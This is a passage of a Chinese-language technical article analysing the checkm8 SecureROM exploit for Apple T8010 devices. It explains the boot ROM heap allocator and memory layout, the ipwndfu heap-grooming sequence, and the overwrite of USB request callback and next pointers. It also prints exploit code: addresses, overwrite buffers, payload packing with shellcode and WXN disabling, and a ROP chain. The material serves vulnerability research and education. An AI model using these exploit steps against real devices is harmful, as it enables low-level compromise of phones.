<p>计算实际分配大小时，会在用户请求大小的基础上增加堆头元数据的空间，能够分配的最小堆块为0x50，大于0x50的堆块要和0x40对齐。</p>

<p>分配堆块的主要逻辑是grab_chunk函数，从bins链头部开始遍历，表寻找尺寸合适的空闲堆块。</p>

<p>若空闲堆块大于所需空间，那么切分空闲堆块，剩下部分重新加入bins链表。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">grab_chunk</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">user_size</span><span class="p">){</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">bin</span><span class="o">=</span> <span class="n">compute_bin</span><span class="p">(</span><span class="n">size</span><span class="p">);</span> <span class="n">bin</span><span class="o">&lt;</span> <span class="n">NUM_BINS</span><span class="p">;</span> <span class="n">bin</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">curr</span><span class="p">;</span>
		<span class="n">curr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">bins</span><span class="p">[</span><span class="n">bin</span><span class="p">];</span>
		<span class="n">curr</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">next_in_bin</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">sizeof_block</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">verify_block_checksum</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">);</span>
				<span class="n">free_list_remove</span><span class="p">(</span><span class="n">curr</span><span class="p">);</span>
				<span class="n">split_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_size</span><span class="p">);</span>

				<span class="k">return</span> <span class="n">curr</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">curr</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">next_in_bin</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">heap_malloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">caller_name</span><span class="p">){</span>
	<span class="kt">size_t</span> <span class="n">size_r</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">retval</span><span class="p">;</span>
	
	<span class="n">size_r</span> <span class="o">=</span> <span class="n">required_size</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
	<span class="n">retval</span> <span class="o">=</span> <span class="n">grab_chunk</span><span class="p">(</span><span class="n">size_r</span> <span class="o">+</span> <span class="n">size_d</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong>5. 堆的初始化</strong></p>

<p>堆的初始化由heap_add_chunk函数完成，调用路径为_main —&gt; sys_init —&gt; heap_add_chunk。</p>

<p>堆区域从0x1801B4000开始，大小为0x4C000。</p>

<p>heap_add_chunk将0x1801B4040～0x1801FFFC0之间的区域构造成空闲块，放入bins[12]链表中作为第一个链表元素。</p>

<p>初始化完成后，malloc就从bins[12]开始分割所需大小。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5.jpg" alt="checkm8-第 15 页.jpg" /></p>

<p><strong>6. 安全检查</strong></p>

<p>verify_block_checksum函数计算堆块元数据heap_block的校验和，与保存在heap_block中的checksum对比，若不相等则触发panic。作用是检查堆块是否被破坏。</p>

<p>在分配和释放操作中很多地方都用到了verify_block_checksum，因此对堆块的保护是比较严格的。</p>

<h2 id="securerom内存布局">SecureROM内存布局</h2>

<p>SecureROM运行在aarch64状态，并且打开了MMU，页面粒度为16KB，2级页表分页机制，地址总线为36位。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.49.58.png" alt="截屏2025-03-09 13.49.58.png" /></p>

<p>其中页表索引长度为11位，每个页表包含2048个页表项，页表大小为16KB。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86.jpg" alt="checkm8-虚拟地址划分.jpg" /></p>

<p>页表初始化路径：_main() → arch_cpu_init() → arm_mmu_init()</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.00.49.png" alt="截屏2025-03-09 13.00.49.png" /></p>

<p>L2页表基地址为0x1800A0000</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_08.37.13.png" alt="截屏2025-03-11 08.37.13.png" /></p>

<p>内存布局如下，都是恒等映射，即虚拟地址和物理地址是相等的。</p>

<p>其中代码段和BOOT_TRAMPOLINE段具有可执行权限，堆区域位于0x1801B4000~0x1801FFFF。</p>

<p>在DFU模式下，手机接收的固件会保存在INSECURE_MEMORY区域，固件接收完成后会跳转到这片区域运行。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-SecureROM%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80.jpg" alt="checkm8-SecureROM内存布局.jpg" /></p>

<h1 id="ipwndfu分析">ipwndfu分析</h1>

<h2 id="堆风水">堆风水</h2>

<p>堆风水用到了stall、no_leak、usb_req_leak三个usb接口函数。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nf">stall</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">hole</span><span class="p">):</span>        <span class="c1"># for i in range(5)
</span>	 <span class="nf">no_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>                   <span class="c1"># no_leak
</span> <span class="nf">usb_req_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
 <span class="nf">no_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
 <span class="n">dfu</span><span class="p">.</span><span class="nf">usb_reset</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>               <span class="c1"># 重置USB，释放全部usb_device_io_request对象
</span> <span class="n">dfu</span><span class="p">.</span><span class="nf">release_device</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
</code></pre></div></div>

<p>这些请求的共同参数是：</p>

<ul>
  <li>bmRequestType = 0x80</li>
  <li>bRequest = 6 (GET_DESCRIPTOR操作)</li>
  <li>wValue = 0x304
    <ul>
      <li>wValueHigh = 0x3，USB_DT_STRING，获取字符串)</li>
      <li>wValueLow = 0x4，字符串描述符的下标是4，对应于设备序列号，这台iPhone7的usb序列号是CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</li>
    </ul>
  </li>
  <li>wIndex = 0x40A</li>
</ul>

<p>参数中不同的地方是wLength。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_12.17.57.png" alt="截屏2025-03-09 12.17.57.png" /></p>

<p>usb_device_io_request加入到端点的IO队列末尾等待处理。</p>

<p>若第一个usb_device_io_request得不到处理，后续的usb_device_io_request也会一直卡住。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_do_endpoint_io</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">){</span>
	<span class="k">struct</span> <span class="n">usb_endpoint_instance</span> <span class="o">*</span><span class="n">ep</span><span class="p">;</span>
	<span class="n">u_int32_t</span> <span class="n">epindex</span><span class="p">;</span>
    
	<span class="n">epindex</span> <span class="o">=</span> <span class="n">ep_to_epindex</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">);</span>
	<span class="n">ep</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">synopsys_otg_endpoints</span><span class="p">[</span><span class="n">epindex</span><span class="p">];</span>
    
	<span class="c1">// pending IOs</span>
	<span class="k">if</span><span class="p">(</span><span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">)</span> <span class="p">{</span>		<span class="c1">//新的usb_device_io_request加入ep端点的IO队列尾部，FIFO</span>
		<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">req</span><span class="p">;</span>
		<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="n">req</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
	<span class="p">}</span>
    
	<span class="c1">// IO队列是空的</span>
	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="n">req</span><span class="p">;</span>
    
	<span class="c1">// start transmitting/receiving the data</span>
	<span class="k">if</span><span class="p">(</span><span class="n">ep_to_epdir</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">synopsys_otg_start_endpoint_in</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">);</span>	<span class="c1">//处理DEVICE 2 HOST</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="n">synopsys_otg_start_endpoint_out</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">);</span>	<span class="c1">//处理HOST 2 DEVICE</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>向设备发送重置命令，设备进入到USB重置流程，执行synopsys_otg_abort_endpoint函数，释放IO队列上面的所有usb_device_io_request对象。</p>

<p>调用路径是：handle_interrupt —&gt; synopsys_otg_handle_usb_reset —&gt; usb_core_abort_endpoint —&gt; usb_controller_abort_endpoint —&gt; synopsys_otg_abort_endpoint</p>

<p>synopsys_otg_abort_endpoint先把端点的IO队列整体摘下，保存在aborted_list队列中，通过遍历aborted_list释放所有的usb_device_io_request对象。</p>

<p>释放usb_device_io_request对象先调用callback回调函数，再释放usb_device_io_request对象。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>

	<span class="p">......</span>
	
	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>         <span class="c1">//摘下端点的IO队列</span>
	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	
	<span class="p">......</span>

	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="p">}</span>  
	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>callback回调函数是standard_device_request_cb。</p>

<p>req→io_length是设备向主机返回的字符串的长度，对应于wLength。</p>

<p>setup_request.wLength取最后一次setup报文的wLength值，no_leak是堆风水过程中最后一次操作setup报文，因此setup_request.wLength = 0xC1。</p>

<p>若usb_device_io_request::io_length是0x40对齐，那么向主机回一个zero length packet零长度数据包。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">standard_device_request_cb</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">){</span>
	<span class="k">if</span><span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
		<span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">usb_core_send_zlp</span><span class="p">();</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>usb_core_send_zlp申请一个usb_device_io_request对象，调用usb_controller_do_endpoint_io重新加入到端点的IO队列中。</p>

<p>zlp对象会驻留在堆上，不会被synopsys_otg_abort_endpoint释放。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_send_zlp</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
	<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="p">;</span>
	<span class="c1">//申请usb_device_io_request</span>
	<span class="n">io_request</span> <span class="o">=</span> <span class="n">alloc_ep0_device_io_request</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="p">......</span>
	
  <span class="c1">//加入EP0端点的IO队列</span>
	<span class="n">usb_controller_do_endpoint_io</span><span class="p">(</span><span class="n">io_request</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>堆风水的目的是形成两个zlp对象卡位，这样第二轮getDFUImage的堆布局就会发生变化，此时往ep0_data_phase_buffer指向的缓冲区写数据就会造成堆溢出，覆盖usb_device_io_request对象的callback和next指针。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%A0%86%E9%A3%8E%E6%B0%B4.jpg" alt="checkm8-堆风水.jpg" /></p>

<h2 id="堆模拟器">堆模拟器</h2>

<p>在第二轮getDFUImage中向ep0_data_phase_buffer指向的缓冲区写入多少字节可以抵达usb_device_io_request对象？</p>

<p>在分配usb_device_io_request对象之前，getDFUImage先分配一些对象：</p>

<ul>
  <li>分配各种字符串描述符
    <ul>
      <li>Nonce（234字节）</li>
      <li>Manufacturer（22字节）</li>
      <li>Product（62字节）</li>
      <li>Serial Number（198字节）</li>
      <li>Configuration string （62字节）</li>
    </ul>
  </li>
  <li>USB任务资源
    <ul>
      <li>synopsys_otg_task任务的task structure（0x3C0字节）</li>
      <li>synopsys_otg_task任务的栈（0x1000字节）</li>
    </ul>
  </li>
  <li>io_buffer（0x800字节）</li>
  <li>配置描述符
    <ul>
      <li>High-Speed（25字节）</li>
      <li>Full-Speed（25字节）</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E8%A6%86%E7%9B%96%E8%B7%9D%E7%A6%BB.jpg" alt="checkm8-覆盖距离.jpg" /></p>

<p>把堆的实现代码拿到Ubunut22.04下进行重构，模拟上述初始化过程的对象分配，计算出覆盖距离：
为0x5C0。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-13_14.40.01.png" alt="截屏2025-03-13 14.40.01.png" /></p>

<h2 id="控制流劫持">控制流劫持</h2>

<p>libusb1_async_ctrl_transfer向设备发起DFU_DNLOAD请求，在等待0.0001秒之后取消数据传输。在此过程中handle_interface_request函数把io_buffer指针赋值给ep0_data_phase_buffer。</p>

<p>libusb1_no_error_ctrl_transfer向设备发出DFU_CLR_STATUS请求，getDFUImage释放USB资源，2个zlp对象驻留在堆上面。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nf">libusb1_async_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x800</span><span class="p">,</span> <span class="mf">0.0001</span><span class="p">)</span>
  <span class="nf">libusb1_no_error_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">#触发漏洞
</span></code></pre></div></div>

<p>这两步完成之后堆的布局如下：</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_23_%E9%A1%B5.jpg" alt="checkm8-第 23 页.jpg" /></p>

<p>usb_req_leak会在第二轮getDFUImage过程中在堆上申请到一个usb_device_io_request对象用于被覆盖。</p>

<p>覆盖到callback和next指针的距离是0x5E0，分别用t8010_nop_gadget和0x1800B0800覆盖callback和next指针。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">t8010_nop_gadget</span> <span class="o">=</span> <span class="mh">0x10000CC6C</span>
<span class="n">t8010_overwrite</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\0</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x5c0</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;32x2Q</span><span class="sh">'</span><span class="p">,</span> \
											<span class="n">t8010_nop_gadget</span><span class="p">,</span> <span class="mh">0x1800B0800</span><span class="p">)</span>
											
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">leak</span><span class="p">):</span> <span class="c1"># for i in range(1)
</span>	<span class="nf">usb_req_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>       <span class="c1"># 分配usb_device_io_request对象被覆盖
</span>
<span class="c1">#覆盖usb_device_io_request对象的callback和next指针
</span><span class="nf">libusb1_no_error_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t8010_overwrite</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
</code></pre></div></div>

<p>向设备发送重置命令，设备进入到USB重置流程，执行synopsys_otg_abort_endpoint函数，释放io链表上面的所有usb_device_io_request对象。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>

	<span class="p">......</span>
	
	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>
	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	
	<span class="p">......</span>

	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>在释放usb_device_io_request对象之前，会调用usb_device_io_request::callback回调函数控制流被劫持到t8010_nop_gadget。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="p">}</span>
    
	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h1 id="rop过程分析">ROP过程分析</h1>

<h2 id="拷贝rop链">拷贝ROP链</h2>

<p>向手机发送bmRequest=0x21，bRequest=1的数据传输Transaction，开始DFU下载过程，payload最终会拷贝到INSECURE_MEMORY区域。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="n">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mh">0x800</span><span class="p">)</span><span class="o">:</span>
    <span class="n">libusb1_no_error_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="o">:</span><span class="n">i</span><span class="o">+</span><span class="mh">0x800</span><span class="p">],</span> <span class="mi">100</span><span class="p">)</span>
</code></pre></div></div>

<p>payload被拆分成为2次Transaction进行传输，每个Transaction分别写入发送2048字节和352字节。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E5%8F%91%E9%80%81payload%E6%8A%93%E5%8C%85.png" alt="发送payload抓包.png" /></p>

<p>payload的构造函数如下，包含了shellcode、伪造页表项、关闭WXN的指令片段、ROP链。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">cpid</span><span class="p">):</span>
	<span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;1024sQ504x2Q496s32x</span><span class="sh">'</span><span class="p">,</span> <span class="n">t8010_shellcode</span><span class="p">,</span> \
	<span class="mh">0x1000006A5</span><span class="p">,</span> <span class="mh">0x60000180000625</span><span class="p">,</span> <span class="mh">0x1800006A5</span><span class="p">,</span> \
	<span class="nf">prepare_shellcode</span><span class="p">(</span><span class="sh">'</span><span class="s">t8010_t8011_disable_wxn_arm64</span><span class="sh">'</span><span class="p">))</span> \
	<span class="o">+</span> <span class="nf">usb_rop_callbacks</span><span class="p">(</span><span class="mh">0x1800B0800</span><span class="p">,</span> <span class="n">t8010_func_gadget</span><span class="p">,</span> <span class="n">t8010_callbacks</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%84.jpg" alt="checkm8-rop链大概结构.jpg" /></p>

<h2 id="rop链的推进">ROP链的推进</h2>

<p>usb_device_io_request::next指针覆盖为0x1800B0800，指向攻击者在INSECURE_MEMORY区域构造的faka usb_device_io_request对象。</p>

<p>usb_device_io_request::callback函数指针覆盖为0x10000CC6C。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_15.43.00.png" alt="截屏2025-03-10 15.43.00.png" /></p>

<p>这条gadget做了一件事情，跳过free(io_req)直接回到while(aborted_list)循环，去执行下一个fake usb_device_io_request对象的callback回调函数。</p>

<p>这么做的原因是，覆盖callback和next指针的过程中已经破坏了usb_device_io_request对象所在堆块的元数据，此时free就会引发panic异常。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="p">}</span>
    
	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>

	<span class="p">......</span>
	
	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>
	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	
	<span class="p">......</span>

	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>保存usb_core_complete_endpoint_io函数返回地址的X30寄存器一开始就被保存在了栈上面，所以gadget的作用就是把X30出栈，即可直接返回到while(aborted_list)，如此就绕过了free(io_req)，避免了panic，同时把链表推进到了在INSECURE_MEMORY区域构造的fake usb_device_io_request。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_16.03.27.png" alt="截屏2025-03-10 16.03.27.png" /></p>

<p>每个fake usb_device_io_request对象通过递增next指针，可实现[callback，next]序列紧密排列，while(aborted_list)循环便可以往下推进，每一轮循环调用一次callback函数指针，实现类似于rop链的功能。最后一个fake usb_device_io_request对象的next指针为NULL，表示停止循环。</p>

